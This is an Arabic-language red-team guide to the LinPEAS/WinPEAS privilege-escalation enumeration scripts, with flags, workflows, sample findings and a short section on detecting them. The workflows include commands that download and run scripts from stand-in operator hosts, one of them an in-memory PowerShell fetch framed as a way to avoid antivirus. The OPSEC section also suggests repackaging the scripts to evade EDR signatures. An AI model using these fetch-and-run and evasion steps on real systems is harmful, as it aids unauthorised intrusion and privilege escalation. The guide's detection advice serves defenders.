# LinPEAS / WinPEAS — الدليل الكامل للتعامل مع الأدوات

تُعد مجموعة أدوات PEASS-ng (Privilege Escalation Awesome Scripts Suite) من الأدوات الأساسية للأتمتة في عملية الاستطلاع المحلي (Local Enumeration) بهدف تصعيد الصلاحيات (Privilege Escalation). تقوم هذه الأدوات بفحص شامل لكل الثغرات الممكنة: إصدارات النواة (Kernel)، ملفات SUID، الإمكانيات (Capabilities)، قواعد sudo، المهام المجدولة (Scheduled Tasks)، ضعف أذونات الخدمات (Service ACLs)، كلمات المرور المخزنة بنصوص واضحة (Cleartext creds)، قوالب AD CS، وبيانات السحابة الوصفية (Cloud Metadata). **هي أول أداة يجب تشغيلها بمجرد الحصول على موطئ قدم (Foothold) في النظام.**

## التثبيت والتشغيل (Install / run)

```terminal
# على أنظمة Linux المستهدفة
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/peas.out

# على أنظمة Windows المستهدفة — اختر الإصدار المناسب
winPEASany.exe        # إصدار عام
winPEASx64.exe        # لأنظمة 64-بت
winPEAS.bat           # واجهة الأوامر فقط (cmd-only)
.\winPEAS.ps1         # وحدة PowerShell
```

يجب تشغيل الأداة بصلاحيات المستخدم الذي تم اختراقه — لا تقم بمحاولة رفع الصلاحيات قبل تشغيلها.

## الأنماط والخيارات (Modes / flags)

### LinPEAS

| الخيار (Flag) | التأثير |
|------|--------|
| `-a` | إجراء كافة الفحوصات (الإعداد الافتراضي في المهام) |
| `-s` | نمط التخفي (Stealth): يتخطى عمليات فحص نظام الملفات المزعجة |
| `-q` | النمط الهادئ (Quiet): تقليل المخرجات |
| `-o <module>` | تشغيل وحدة محددة فقط (`Network`, `Files`, `Processes`...) |
| `-D` | تخطي فحص الملفات الإضافية / الاستكشاف (أسرع) |
| `-N` | تخطي فحوصات الشبكة |
| `-P <password>` | كلمة مرور Sudo (لتجربة `sudo -l` وغيرها) |
| `-W` | الانتظار لضغط زر بين الوحدات (تفاعلي) |
| `--help` | عرض قائمة الوحدات المتاحة |

### WinPEAS

| الخيار (Flag) | التأثير |
|------|--------|
| `domain` | استطلاع النطاق (AD enumeration) |
| `notcolor` | إزالة ألوان ANSI |
| `quiet` | كتم شعار الأداة (Banner) |
| `nosearch` | تخطي البحث البطيء عن الملفات |
| `searchfast` | بحث أسرع ولكن أقل دقة |
| `wait` | توقف مؤقت قبل كل قسم |
| `applicationsinfo` | معلومات التطبيقات المثبتة |
| `processinfo` | العمليات الجارية |
| `serviceinfo` | أذونات الخدمات (Service ACLs) |
| `userinfo` | تفاصيل المستخدمين / المجموعات / الصلاحيات |
| `windowscreds` | البحث عن بيانات الاعتماد المخزنة |
| `lolbas` | الملفات التنفيذية المتعلقة بـ LOLBAS |
| `cloudinfo` | بيانات السحابة الوصفية (AWS / Azure / GCP) |

## نظام الترميز اللوني (What gets flagged)

- **الأحمر/الأصفر (Red/Yellow)** = احتمالية عالية جداً لتصعيد الصلاحيات (Privesc).
- **الأخضر (Green)** = معلومات عامة.
- **الأزرق (Blue)** = معلومات أساسية أو وضع جيد.

تعرض LinPEAS في النهاية شعار "Probable PE" يلخص أفضل الفرص المتاحة للتصعيد.

## مسارات العمل (Workflows)

### المسار القياسي من Linux Shell

```terminal
wget http://operator:8000/lp.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
/tmp/lp.sh -a 2>&1 | tee /tmp/peas.txt
# قراءة ملف peas.txt خارج النظام؛ ابحث عن الأسطر الملونة بالأحمر والأصفر
```

### تشغيل WinPEAS عبر Webshell (بدون الكتابة على القرص لتجنب AV)

```powershell
iex (New-Object Net.WebClient).DownloadString('http://op/winPEAS.ps1')
```

### تشغيل وحدات محددة فقط (أداء أسرع)

```terminal
./linpeas.sh -o Software,Network,Container -q | tee peas.txt
```

## أبرز مخرجات الأداة (Good output highlights)

في أنظمة Linux:

```
[+] Vulnerable to CVE-2022-0847 (DirtyPipe)?
    YES — kernel 5.15.0 vulnerable.

[+] Looking for SUID files...
    /usr/bin/find    → انظر لموقع GTFOBins
    /tmp/secret.bin  → ملف SUID مخصص، قابل للكتابة من الجميع

[+] Sudo rules:
    User alice may run the following:
    (root) NOPASSWD: /usr/bin/python3 /opt/admin.py
        ↑ مرشح لحقن الأوامر (Command Injection)

[+] Capabilities:
    /usr/bin/python3 = cap_setuid+ep   → خدعة setuid(0)
```

في أنظمة Windows:

```
[!] Always-installed Elevated → ثغرة MSI privesc ممكنة
[!] AlwaysInstallElevated registry HKLM and HKCU = 1
[!] Service "BadService" — يمكن تعديلها من قبل Authenticated Users
[!] Unquoted service path: C:\Program Files\My App\service.exe
[!] AutoLogon credentials in registry
```

## المشاكل التقنية والحلول (Bad / problematic output and fixes)

| العرض (Symptom) | الحل |
|---------|-----|
| الأداة تتوقف مبكراً | أخطاء أذونات في `/proc/*/exe` — أمر طبيعي؛ المخرجات الجزئية كافية |
| المخرجات ضخمة جداً | استخدم `-D -q -s`؛ أو استخدم `-o` لوحدة واحدة فقط |
| الألوان تفسد شاشة الأوامر | `--no-color` (LinPEAS) / `notcolor` (WinPEAS) |
| تعليق عند البحث عن الملفات | `nosearch` (Windows) / `-D` (Linux) |
| عدم تطابق إصدار النواة | نسخة PEASS قديمة | أعد تحميل أحدث إصدار من GitHub |

## منظور الدفاع (Defender's perspective)

- عبر Sysmon/Auditd: ملاحظة تكرار أوامر مثل `find / -perm -4000`, `getcap -r /`, `crontab -l`, `cat /etc/passwd`, `cat /etc/shadow`, واستعلامات `ldap` — وهذا نمط سلوكي مميز لـ LinPEAS.
- في Windows: رشقات (Bursts) من عمليات قراءة WMI و ServiceController وسجل النظام (Registry) من جلسة مستخدم واحدة.

أفكار للكشف (Detection):
- قاعدة Sigma: البحث عن اسم الملف `linpeas.sh` في عمليات إنشاء العمليات.
- قاعدة Auditd: رصد تكرار استخدام `find` مع معيار `-perm -4000`.

## أمن العمليات (OPSEC)

- أدوات LinPEAS / WinPEAS تُحدث ضجيجاً كبيراً (Noisy) بسبب آلاف فحوصات الملفات. استخدم أنماط `-s -D` لزيادة التخفي.
- السكربتات الافتراضية لها تواقيع (SHA-256 hashes) معروفة ترصدها أنظمة EDR — يفضل إعادة حزمها (Repackage) بتعليقات عشوائية أو تغيير أسماء المتغيرات.
- في المهمات عالية الحساسية: يفضل إجراء الاستطلاع المستهدف يدوياً (مثل `sudo -l`, `getcap -r /`, `find / -perm -4000`) بدلاً من تشغيل PEAS بالكامل.

## أدوات ذات صلة (Related tools)

| الأداة | التخصص |
|------|-------|
| **linux-exploit-suggester** | ترشيحات لثغرات النواة (Kernel-LPE) |
| **Seatbelt** (.NET) | فحص الوضع الأمني في Windows، أكثر توافقاً مع OPSEC |
| **PowerUp** / **SharpUp** | تدقيق ثغرات تصعيد الصلاحيات في Windows |
| **les2** | نسخة حديثة من LES |
| **deepce** | فحوصات تصعيد الصلاحيات في الحاويات (Containers) |
| **PrivescCheck** | سكربت PowerShell لفحص ثغرات Windows |
